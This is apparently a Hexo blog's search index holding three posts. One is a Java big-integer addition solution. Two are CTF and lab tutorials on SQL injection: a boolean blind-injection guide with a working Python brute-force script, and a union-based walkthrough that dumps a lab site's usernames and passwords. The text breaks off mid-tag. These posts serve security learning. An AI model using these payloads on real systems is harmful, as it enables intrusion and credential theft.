<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>高精度加法（Java）</title>
      <link href="/2024/03/12/gao-jing-du-jia-fa-java/"/>
      <url>/2024/03/12/gao-jing-du-jia-fa-java/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.acwing.com/problem/content/793/">原题链接</a></p><p>构造方法</p><p>BigInteger(byte[] val)<br>将包含BigInteger的二进制补码二进制表达式的字节数组转换为BigInteger<br>BigInteger(int numBits, Random rnd)<br>构造一个随机生成的BigInteger，均匀分布在0到（2 numBits - 1）的范围内。<br>BigInteger(String val)<br>将BigInteger的十进制字符串表示形式转换为BigInteger。 </p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>math<span class="token punctuation">.</span></span><span class="token class-name">BigInteger</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Scanner</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">{</span>        <span class="token class-name">BufferedReader</span> br <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BufferedReader</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">InputStreamReader</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span>in<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">BigInteger</span> a <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BigInteger</span><span class="token punctuation">(</span>br<span class="token punctuation">.</span><span class="token function">readLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">BigInteger</span> b <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BigInteger</span><span class="token punctuation">(</span>br<span class="token punctuation">.</span><span class="token function">readLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        br<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用类似手算的加法方法</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">ArrayList</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">List</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Scanner</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Scanner</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">Scanner</span> scanner <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Scanner</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">BufferedInputStream</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span>in<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> a <span class="token operator">=</span> scanner<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> b <span class="token operator">=</span> scanner<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> aLength <span class="token operator">=</span> a<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> bLength <span class="token operator">=</span> b<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">&gt;</span></span> list <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">1e6</span><span class="token operator">+</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> carry <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> max <span class="token operator">=</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>aLength<span class="token punctuation">,</span>bLength<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>max <span class="token operator">--</span><span class="token operator">&gt;</span> <span class="token number">0</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">int</span> x <span class="token operator">=</span> aLength <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">?</span> <span class="token number">0</span> <span class="token operator">:</span> a<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>aLength<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token char">'0'</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> y <span class="token operator">=</span> bLength <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">?</span> <span class="token number">0</span> <span class="token operator">:</span> b<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>bLength<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token char">'0'</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> sum <span class="token operator">=</span> x <span class="token operator">+</span> y <span class="token operator">+</span> carry<span class="token punctuation">;</span>            list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>sum <span class="token operator">%</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            carry <span class="token operator">=</span> sum <span class="token operator">/</span> <span class="token number">10</span><span class="token punctuation">;</span>            aLength<span class="token operator">--</span><span class="token punctuation">;</span>            bLength<span class="token operator">--</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>carry <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> list<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&gt;=</span> <span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">--</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>list<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>补充： Java List<integer> list如何使用</integer></p><p><strong>List</strong> 是 Java 中用于存储元素的有序集合。它允许您添加、删除和检索元素。List 接口有多个实现，其中最常见的是 <strong>ArrayList</strong> 和 <strong>LinkedList</strong>。</p><p>List<integer>表示一个存储整数元素的列表。</integer></p><p>创建 List<integer></integer></p><p>使用 new 关键字</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">&gt;</span></span> list <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用 Arrays.asList() 方法</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Integer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> array <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">&gt;</span></span> list <span class="token operator">=</span> <span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">asList</span><span class="token punctuation">(</span>array<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p> 使用 List.of() 方法 (Java 9 及更高版本)</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">&gt;</span></span> list <span class="token operator">=</span> <span class="token class-name">List</span><span class="token punctuation">.</span><span class="token function">of</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>添加元素</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 添加元素到列表末尾</span>list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 添加元素到列表指定位置</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>删除元素</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">list<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 删除列表第一个元素</span>list<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 删除列表中值为 1 的元素</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>检索元素</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">int</span> element <span class="token operator">=</span> list<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 获取列表第一个元素</span><span class="token keyword">int</span> size <span class="token operator">=</span> list<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 获取列表元素个数</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>遍历列表</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> list<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> element <span class="token operator">=</span> list<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// ...</span><span class="token punctuation">}</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> element <span class="token operator">:</span> list<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment">// ...</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其他常见操作</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">list<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>element<span class="token punctuation">)</span>：检查列表是否包含指定元素list<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span>：检查列表是否为空list<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span>：清空列表<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WEB安全-SQL布尔盲注</title>
      <link href="/2023/12/22/web-an-quan-sql-bu-er-mang-zhu/"/>
      <url>/2023/12/22/web-an-quan-sql-bu-er-mang-zhu/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>布尔盲注适用于回显为“查询成功”和“查询失败”，而不是具体的值</p><h2 id="思路步骤"><a href="#思路步骤" class="headerlink" title="思路步骤"></a>思路步骤</h2><p><strong>Step 1: 找注入点</strong></p><p>关于找注入点比较简单，学过SQL注入应该都会，如果题目给了源码就直接看着SQL语句构造就行了。</p><p>如果没有给源码，我们需要先测试字段类型是字符型还是数字型，然后看是否有回显，然后用<code>or 1=1#</code>之类的东西去测试。具体测试时，我们先想象他的SQL语句是<code>select xx from yy where zz = '$your_input';</code> 因为基本所有题的SQL语句都是这个结构，在这个SQL语句结构的基础上去测试就好了。</p><p><strong>Step 2: 构造condition</strong></p><p>所谓的condition就是某个条件，这个条件的真与假可以影响SQL语句的查询结果，进而影响WEB页面的回显。例如输入<code>0' or 1=1#</code>和<code>0' or 1=2#</code>(<code>#</code>是注释符)：</p><pre class="line-numbers language-SQL" data-language="SQL"><code class="language-SQL">SELECT name, mojority FROM student WHERE student_id = '0' or 1=1#'  #查询成功SELECT name, mojority FROM student WHERE student_id = '0' or 1=2#'  #查询失败<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这里我们可以明确的知道student_id为0的学员是不可能存在的，那么上述SQL语句的查询结果就完全由<code>or</code>后面的<code>1=1</code>和<code>1=2</code>来决定了。SQL中<code>=</code>意为“是否相等”，所以<code>1=1</code>就表示<code>1是否等于1</code>,这是一个布尔表达式，它的结果只有True和False两种。</p><p>这个能直接影响整个SQL语句查询结果的<code>1=1</code>和<code>1=2</code>，也就是这个布尔条件表达式，就是我们目前Step 2要构造的condition。</p><p><strong>Step 3: 注数据</strong></p><p>现在我们只需要将Step 2构造的Condition换成具体的注入数据的语句，就可以了！</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> name<span class="token punctuation">,</span> mojority <span class="token keyword">FROM</span> student <span class="token keyword">WHERE</span> student_id <span class="token operator">=</span> <span class="token string">'0'</span> <span class="token operator">or</span> substr<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token string">'a'</span><span class="token keyword">SELECT</span> name<span class="token punctuation">,</span> mojority <span class="token keyword">FROM</span> student <span class="token keyword">WHERE</span> student_id <span class="token operator">=</span> <span class="token string">'0'</span> <span class="token operator">or</span> substr<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token string">'b'</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="布尔盲注中的布尔回显"><a href="#布尔盲注中的布尔回显" class="headerlink" title="布尔盲注中的布尔回显"></a>布尔盲注中的布尔回显</h3><ol><li>最常见的就是回显的内容不同，比如<code>查询成功</code>和<code>查询失败</code>，回显长度有时也可以</li><li>返回的HTTP头的不同，比如结果为真可能会返回Location头或者set-cookie</li><li>看HTTP状态码，比如结果为真则3xx重定向，为假则返回200</li></ol><h3 id="盲注脚本的编写"><a href="#盲注脚本的编写" class="headerlink" title="盲注脚本的编写"></a>盲注脚本的编写</h3><p>分析可知：</p><ul><li>针对截取的每一位，都要把字母表跑一遍来判断是否相等，因此需要两层循环，外层循环为位数，内层循环为具体值。</li><li>对于注入不同的数据，只要修改内部子查询就好了，其他的部分不需要改动，因此可以把子查询写成一个单独的变量。</li></ul><p>于是可以写出这样的注入脚本：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 导入所需模块</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> string <span class="token comment"># 构造字母表，根据字母表去爆破每一位的具体值</span>alphabet <span class="token operator">=</span> string<span class="token punctuation">.</span>ascii_letters <span class="token operator">+</span> string<span class="token punctuation">.</span>digits <span class="token operator">+</span> <span class="token string">",}{_="</span><span class="token comment"># 题目的URL</span>url <span class="token operator">=</span> <span class="token string">"http://127.0.0.01/?student_id="</span><span class="token comment"># 注入什么数据，select变量就写什么子查询语句</span>select <span class="token operator">=</span> <span class="token string">"select database()"</span> select <span class="token operator">=</span> <span class="token string">"select group_concat(table_name) from information_schema.tables where table_schema=database()"</span> <span class="token comment"># 用来保存注入出的结果</span>result <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment"># 外层循环，从1开始，因为截取的位数是从1开始的</span>    <span class="token keyword">for</span> ch <span class="token keyword">in</span> alphabet<span class="token punctuation">:</span> <span class="token comment"># 内层循环，是具体需要测试的值</span>        <span class="token comment"># 构造SQL语句，发起请求</span>        payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"2019122001' and substr((</span><span class="token interpolation"><span class="token punctuation">{</span>select<span class="token punctuation">}</span></span><span class="token string">) ,</span><span class="token interpolation"><span class="token punctuation">{</span>i<span class="token punctuation">}</span></span><span class="token string">,1) = '</span><span class="token interpolation"><span class="token punctuation">{</span>ch<span class="token punctuation">}</span></span><span class="token string">' %23"</span></span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token operator">+</span>payload<span class="token punctuation">)</span>        <span class="token comment"># 根据回显判断，如果得到了表示查询成功的回显，那么说明判断数据的这一位是正确的</span>        <span class="token keyword">if</span> <span class="token string">"查询成功"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            result <span class="token operator">+=</span> ch             <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"注入成功："</span><span class="token punctuation">,</span> result<span class="token punctuation">)</span>            <span class="token keyword">break</span> <span class="token comment"># 这一位已经跑出来了，可以break掉然后下一轮循环跑下一位数据了</span>        <span class="token comment"># 如果已经跑到了字母表最后一位都还没有进到上面的if然后break，说明这轮循环没跑出来正确结果，说明注入完成（或者注入payload写的有问题注入失败），脚本没必要继续跑下去了</span>        <span class="token keyword">if</span> ch <span class="token operator">==</span> alphabet<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"注入完成"</span><span class="token punctuation">)</span>            exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>另有参考</p><p><img src="/2023/12/22/web-an-quan-sql-bu-er-mang-zhu/image-20231222003708529.png"></p><p>…未完待续</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> WEB Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WEB Security </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WEB安全-SQL手工注入漏洞测试(MySQL数据库)</title>
      <link href="/2023/12/21/web-an-quan-sql-shou-gong-zhu-ru-lou-dong-ce-shi-mysql-shu-ju-ku/"/>
      <url>/2023/12/21/web-an-quan-sql-shou-gong-zhu-ru-lou-dong-ce-shi-mysql-shu-ju-ku/</url>
      
        <content type="html"><![CDATA[<h2 id="靶场"><a href="#靶场" class="headerlink" title="靶场"></a>靶场</h2><p><a href="https://www.mozhe.cn/bug/detail/82">墨者学院</a></p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><h3 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h3><h4 id="1-在注入前的信息收集步骤是在整个注入过程中非常重要的一步，我们首先最好了解需要测试网站的相关信息，例如："><a href="#1-在注入前的信息收集步骤是在整个注入过程中非常重要的一步，我们首先最好了解需要测试网站的相关信息，例如：" class="headerlink" title="1.在注入前的信息收集步骤是在整个注入过程中非常重要的一步，我们首先最好了解需要测试网站的相关信息，例如："></a>1.在注入前的信息收集步骤是在整个注入过程中非常重要的一步，我们首先最好了解需要测试网站的相关信息，例如：</h4><p>（1）操作系统（Linux/Windows）</p><p>（2）数据库类型（不同的数据库类型，注入方法会有所不同）</p><p>（2）数据库名</p><p>（3）数据库用户</p><p>（4）数据库版本</p><p>（5)其他（网站路径，根目录等）</p><h4 id="2-注入权限"><a href="#2-注入权限" class="headerlink" title="2.注入权限"></a>2.注入权限</h4><p><img src="/2023/12/21/web-an-quan-sql-shou-gong-zhu-ru-lou-dong-ce-shi-mysql-shu-ju-ku/image-20231221232852852.png"></p><h3 id="二、注入步骤（以墨者注入靶场为例）"><a href="#二、注入步骤（以墨者注入靶场为例）" class="headerlink" title="二、注入步骤（以墨者注入靶场为例）"></a>二、注入步骤（以墨者注入靶场为例）</h3><h4 id="1-判断是否存在注点"><a href="#1-判断是否存在注点" class="headerlink" title="1.判断是否存在注点"></a>1.判断是否存在注点</h4><p><img src="/2023/12/21/web-an-quan-sql-shou-gong-zhu-ru-lou-dong-ce-shi-mysql-shu-ju-ku/image-20231221233059840.png"></p><p>这里在尝试了用户名单注入，双拼注入都不行…</p><p>具体参考了<a href="https://blog.csdn.net/u011027547/article/details/124403609">sql注入的几种方式【网络攻防CTF】（保姆级图文</a></p><p>然后点进平台维修部通知</p><p><img src="/2023/12/21/web-an-quan-sql-shou-gong-zhu-ru-lou-dong-ce-shi-mysql-shu-ju-ku/image-20231221233446158.png"></p><p>发现域名有?id=1</p><p>判断是否存在注点的方法就是在可变参数id=1后加上and 1=1，页面显示正常（与之前页面显示相同），而如果填入and 1=2，页面显示错误或有很大变化，则有可能存在注点。（这里不一定要写and 1= 2，只要随便输入一些字符字母，可以使网页报错即可）</p><h4 id="2-猜解数据库列名数量"><a href="#2-猜解数据库列名数量" class="headerlink" title="2.猜解数据库列名数量"></a>2.猜解数据库列名数量</h4><p>验证界面的查询语句有几个字段–判断长度使用order by 语句</p><p>例如：在id=1后加上order by 1, order by 2, …, order by 5（这个数字代表该网站数据库存在列数，可以使用二分法进行查找，找到使页面显示错误的最小数值，及猜页面错误与正常的临界值，例如此处当输入order by 5，页面报错，及该数据库存在4列）。</p><h4 id="3-报错拆解准备"><a href="#3-报错拆解准备" class="headerlink" title="3.报错拆解准备"></a>3.报错拆解准备</h4><p>验证字段再界面显示位置—判断回显位置</p><p>输入?id=-1 union select 1,2,3,4或?id=1 and 1=2 union select 1,2,3,4都会出现报错数字，这个数字是随机产生的，报错数字是几就在数字几上进行查询，这里是2和3。</p><p><img src="/2023/12/21/web-an-quan-sql-shou-gong-zhu-ru-lou-dong-ce-shi-mysql-shu-ju-ku/image-20231221234756062.png"></p><p>&lt;补充&gt;数据库版本：version（）              数据库名字 ： database（）</p><p> 数据库用户：user（）   操作系统：@@version_compile_os</p><p> 数据库路径：@@datadir</p><p>例如：</p><p>?id=-1 union select 1,user(),version(),4（查询数据库用户和版本）</p><p><img src="/2023/12/21/web-an-quan-sql-shou-gong-zhu-ru-lou-dong-ce-shi-mysql-shu-ju-ku/image-20231221235447265.png"></p><p>?id=-1 union select 1,database(),@@version_compile_os,4（查询数据库名字和操作系统）</p><p><img src="/2023/12/21/web-an-quan-sql-shou-gong-zhu-ru-lou-dong-ce-shi-mysql-shu-ju-ku/image-20231221235539758.png"></p><h4 id="4-利用information-schema表进行数据库查询"><a href="#4-利用information-schema表进行数据库查询" class="headerlink" title="4.利用information_schema表进行数据库查询"></a>4.利用information_schema表进行数据库查询</h4><p>（1）在MYSQL5.0以上的版本中，mysql存在一个自带数据库库名，表名，列名的数据库，也相当于可以通过查询它获取到指定数据库下面的表名活列名信息。<br>information_schema.schemata:记录所有数据库名信息的表</p><p>information_schema.tables:记录所有表名信息的表</p><p>information_schema.columns:记录所有列名信息的表</p><p>table_schema:数据库名</p><p>table_name:表名</p><p>column_name:列名</p><p>(在5.0版本以下的话只能暴力方法了)</p><p>（2）通过之前查询获取到数据库名为 mozhe_Discuz_StormGroup，所以查询该数据库下的表名信息。<br>?id=-1 union select 1, group_concat(table_name),3,4 from information_schema.tables where table_schema=’mozhe_Discuz_StormGroup’</p><p>或者可以直接?id=-1 union select 1, group_concat(table_name),3,4 from information_schema.tables where table_schema=database()</p><p><img src="/2023/12/21/web-an-quan-sql-shou-gong-zhu-ru-lou-dong-ce-shi-mysql-shu-ju-ku/image-20231221235929863.png"></p><p>注意此处table_name列有好几个值需要group_concat()函数连接一下</p><p>然后注意到用户密码之类的东西应该在名为StormGroup_member的表中</p><p>（3）获取到存储用户的表名应该为StormGroup_member，所以查询该表名下的列名信息。</p><p> ?id=-1 union select 1, group_concat(column_name),3,4 from information_schema.columns where table_name=’StormGroup_member’</p><p><img src="/2023/12/21/web-an-quan-sql-shou-gong-zhu-ru-lou-dong-ce-shi-mysql-shu-ju-ku/image-20231222000240689.png"></p><p>（4）查询指定数据</p><p>那肯定直接查用户名和密码了</p><p>?id=-1 union select 1, group_concat(name),group_concat(password),4 from StormGroup_member</p><p><img 